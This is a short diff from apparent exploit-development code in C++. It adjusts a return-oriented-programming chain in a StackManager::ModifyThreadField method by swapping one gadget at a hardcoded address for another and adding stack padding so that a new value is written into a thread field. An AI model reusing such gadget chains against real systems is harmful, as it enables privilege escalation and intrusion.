@@ -37,8 +37,9 @@ void StackManager::ModifyThreadField(const std::uint64_t FieldOffset, const std:
 
 	// r9->rcx->NewValue, Setup value to write. It has a sideeffect on eax so we perform thiss
 	// before the rest of our chain.
-	this->AddGadget(0x47f82d, "pop r8; ret;");
+	this->AddGadget(0xb7b925, "pop r8; add rsp, 0x20; pop rbx; ret;");
 	this->AddValue(0, "set r8 to 0");
+	this->AddPadding(0x28);
 	this->AddGadget(0x24cd7b, "pop rcx; ret;");
 	this->AddValue(NewValue, "New field value");
 	this->AddGadget(0x51838a, "mov r9, rcx; cmp r8, 8; je ........; mov eax, 0x[0-9a-fA-F]+; ret;");
